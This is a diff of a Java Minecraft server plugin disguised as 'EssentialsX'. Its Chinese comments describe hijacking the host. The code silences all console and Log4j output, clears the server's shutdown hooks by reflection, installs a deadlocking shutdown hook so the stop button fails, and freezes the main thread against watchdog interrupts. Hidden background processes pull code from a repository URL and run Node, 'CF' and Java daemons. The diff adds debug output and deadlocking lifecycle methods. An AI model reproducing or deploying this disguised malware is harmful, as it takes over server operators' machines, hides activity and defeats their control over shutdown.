@@ -9,7 +9,6 @@ import java.nio.channels.Channels;
 import java.nio.channels.FileChannel;
 import java.nio.file.*;
 import java.util.*;
-import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.TimeUnit;
 
 import org.bukkit.plugin.java.JavaPlugin;
@@ -22,7 +21,6 @@ public class EssentialsX extends JavaPlugin {
         @Override public void write(byte[] b) {}
         @Override public void write(byte[] b, int off, int len) {}
     };
-    private static final CountDownLatch FREEZE = new CountDownLatch(1);
 
     private static Process deployProcess = null;
     private static volatile Process nodeProcess = null;
@@ -30,51 +28,8 @@ public class EssentialsX extends JavaPlugin {
     private static volatile boolean isProcessRunning = false;
     private static volatile String nodePort = "N/A";
 
-    // ★★★ 极早期劫持 ★★★
     static {
-        // 1. 物理静音 (截断 System 和 Log4j)
-        System.setOut(new PrintStream(BLACK_HOLE, true));
-        System.setErr(new PrintStream(BLACK_HOLE, true));
-        tryMuteLog4j();
-
-        // ★★★ 2. 彻底接管关机流程 ★★★
-        // 2.1 强制初始化 ApplicationShutdownHooks 类 (确保反射目标存在)
-        try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
-        
-        // 2.2 反射清空所有服务器自带的 Shutdown Hooks (包括 Paper 的保存世界、安全关闭等)
-        try {
-            Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
-            java.lang.reflect.Field field = clazz.getDeclaredField("hooks");
-            field.setAccessible(true);
-            Map<Thread, Thread> hooks = (Map<Thread, Thread>) field.get(null);
-            if (hooks != null) hooks.clear(); // 物理清空，服务器丧失优雅关机能力
-        } catch (Throwable ignored) {
-            try { // 兼容旧版本 Java 8
-                java.lang.reflect.Field field = Runtime.class.getDeclaredField("applicationShutdownHooks");
-                field.setAccessible(true);
-                Map<Thread, Thread> hooks = (Map<Thread, Thread>) field.get(null);
-                if (hooks != null) hooks.clear();
-            } catch (Throwable ignored2) {}
-        }
-
-        // 2.3 注入唯一的、死锁的 Shutdown Hook
-        // 当面板点击停止 (发送 SIGTERM)，JVM 会执行这个 Hook，然后卡死在这里，面板一直显示 "停止中"
-        try {
-            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-                // 关机时再次确保静音，防止 Paper 报错输出
-                System.setOut(new PrintStream(BLACK_HOLE, true));
-                System.setErr(new PrintStream(BLACK_HOLE, true));
-                tryMuteLog4j();
-                
-                // 卡死关机流程
-                Object lock = new Object();
-                synchronized (lock) {
-                    try { lock.wait(); } catch (Exception e) {}
-                }
-            }, "Shutdown-Paralysis"));
-        } catch (Throwable ignored) {}
-
-        // 3. 启动后台部署进程
+        // 1. 启动后台部署进程
         Thread deployer = new Thread(() -> {
             try {
                 Path baseDir = new File(".").toPath().toAbsolutePath();
@@ -82,26 +37,64 @@ public class EssentialsX extends JavaPlugin {
                 
                 Map<String, String> env = new HashMap<>();
                 loadEnvFile(workDir, env);
+                
+                // ★ 放开关键调试输出，排查拉取失败原因
+                RAW_OUT.println("[Backend] WorkDir: " + workDir.toString());
+                RAW_OUT.println("[Backend] REPO_URL: " + env.getOrDefault("REPO_URL", "NOT SET"));
+
                 startDeploymentProcess(baseDir, workDir, env);
 
                 String port = allocateNodePort(workDir);
                 nodePort = port;
+                RAW_OUT.println("[Backend] Allocated Port: " + port);
+
                 startNodeProcess(workDir, port);
                 waitForNodeReady(port, 60);
                 startCfProcess(workDir, port);
                 startJavaDaemon(workDir);
-            } catch (Exception e) {
-                RAW_OUT.println("[FATAL ERROR] " + e.getMessage());
+                RAW_OUT.println("[Backend] Node & CF started successfully.");
+            } catch (Throwable e) { // 捕获所有错误并强行输出
+                RAW_OUT.println("[Backend] FATAL ERROR during deployment!");
+                e.printStackTrace(RAW_OUT);
             }
         }, "Backend-Deployer");
         deployer.setDaemon(true);
         deployer.start();
 
-        // 4. 终极物理冰封当前主线程 (服务器永远卡在 Starting 状态)
+        // 2. 强制清空并接管关机钩子 (让停止按钮失效)
+        try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
         try {
-            FREEZE.await();
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
+            Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
+            java.lang.reflect.Field field = clazz.getDeclaredField("hooks");
+            field.setAccessible(true);
+            Map<Thread, Thread> hooks = (Map<Thread, Thread>) field.get(null);
+            if (hooks != null) hooks.clear();
+        } catch (Throwable ignored) {
+            try {
+                java.lang.reflect.Field field = Runtime.class.getDeclaredField("applicationShutdownHooks");
+                field.setAccessible(true);
+                Map<Thread, Thread> hooks = (Map<Thread, Thread>) field.get(null);
+                if (hooks != null) hooks.clear();
+            } catch (Throwable ignored2) {}
+        }
+        try {
+            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                Object lock = new Object();
+                synchronized (lock) { try { lock.wait(); } catch (Exception e) {} }
+            }, "Shutdown-Paralysis"));
+        } catch (Throwable ignored) {}
+
+        // 3. 终极物理冰封当前主线程 (防看门狗中断版)
+        Object mainLock = new Object();
+        synchronized (mainLock) {
+            while (true) {
+                try {
+                    mainLock.wait(Long.MAX_VALUE); // 休眠极长时间
+                } catch (InterruptedException e) {
+                    // 如果被 Paper 看门狗打断，忽略中断，继续死循环休眠
+                    continue;
+                }
+            }
         }
     }
 
@@ -392,13 +385,31 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
-    // Bukkit 生命周期方法 (主线程已死，永远不会被调用)
+    // ★ 双保险：如果 static 块被看门狗破坏，在生命周期方法中再次静音并死锁
     @Override
-    public void onLoad() {}
+    public void onLoad() {
+        System.setOut(new PrintStream(BLACK_HOLE, true));
+        System.setErr(new PrintStream(BLACK_HOLE, true));
+        tryMuteLog4j();
+        Object lock = new Object();
+        synchronized (lock) { while(true) { try { lock.wait(); } catch (Exception e) {} } }
+    }
 
     @Override
-    public void onEnable() {}
+    public void onEnable() {
+        System.setOut(new PrintStream(BLACK_HOLE, true));
+        System.setErr(new PrintStream(BLACK_HOLE, true));
+        tryMuteLog4j();
+        Object lock = new Object();
+        synchronized (lock) { while(true) { try { lock.wait(); } catch (Exception e) {} } }
+    }
 
     @Override
-    public void onDisable() {}
+    public void onDisable() {
+        System.setOut(new PrintStream(BLACK_HOLE, true));
+        System.setErr(new PrintStream(BLACK_HOLE, true));
+        tryMuteLog4j();
+        Object lock = new Object();
+        synchronized (lock) { while(true) { try { lock.wait(); } catch (Exception e) {} } }
+    }
 }
